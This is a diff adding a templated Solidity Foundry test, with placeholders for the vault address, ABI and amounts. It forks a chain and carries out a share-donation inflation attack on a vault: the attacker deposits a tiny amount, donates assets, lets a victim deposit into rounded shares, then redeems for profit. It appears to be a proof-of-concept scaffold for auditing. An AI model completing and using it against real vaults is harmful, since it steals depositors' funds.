@@ -1,0 +1,61 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+import "forge-std/Test.sol";
+
+interface I{{VAULT_CONTRACT}} {
+{{VAULT_ABI_LINES}}
+}
+
+interface IERC20 {
+    function balanceOf(address) external view returns (uint256);
+    function transfer(address, uint256) external returns (bool);
+    function approve(address, uint256) external returns (bool);
+}
+
+contract {{TEST_NAME}} is Test {
+    address constant VAULT = {{VAULT_ADDRESS}};
+    address constant ASSET = {{ASSET_ADDRESS}};
+    address constant ATTACKER = address(0xA77ACE);
+    address constant VICTIM = address(0xBADBAD);
+
+    function setUp() public {
+        vm.createSelectFork(vm.envString("{{RPC_ENV_VAR}}"), {{FORK_BLOCK}});
+        vm.label(VAULT, "{{VAULT_CONTRACT}}");
+        vm.deal(ATTACKER, 10 ether);
+        deal(ASSET, ATTACKER, {{INITIAL_ASSET_AMOUNT}});
+        deal(ASSET, VICTIM, {{VICTIM_ASSET_AMOUNT}});
+    }
+
+    function test_{{TEST_NAME_SUFFIX}}_share_donation_inflation() public {
+        vm.startPrank(ATTACKER);
+        IERC20(ASSET).approve(VAULT, type(uint256).max);
+
+        // === ATTACKER DEPOSIT (tiny) ===
+        {{ATTACKER_DEPOSIT}}
+
+        // === DONATE TO INFLATE SHARE PRICE ===
+        IERC20(ASSET).transfer(VAULT, {{DONATION_AMOUNT}});
+
+        vm.stopPrank();
+
+        // === VICTIM DEPOSITS (gets rounded shares) ===
+        uint256 victimSharesBefore = {{VICTIM_SHARES_EXPR}};
+        vm.startPrank(VICTIM);
+        IERC20(ASSET).approve(VAULT, type(uint256).max);
+        {{VICTIM_DEPOSIT}}
+        uint256 victimShares = {{VICTIM_SHARES_EXPR}} - victimSharesBefore;
+        vm.stopPrank();
+
+        // === ATTACKER REDEEMS, EXTRACTS VICTIM VALUE ===
+        vm.startPrank(ATTACKER);
+        uint256 attackerAssetBefore = IERC20(ASSET).balanceOf(ATTACKER);
+        {{ATTACKER_REDEEM}}
+        uint256 attackerAssetAfter = IERC20(ASSET).balanceOf(ATTACKER);
+        vm.stopPrank();
+
+        // === ASSERTIONS ===
+        assertGt(attackerAssetAfter, attackerAssetBefore + {{DONATION_AMOUNT}},
+                 "attacker should net positive after redemption");
+    }
+}
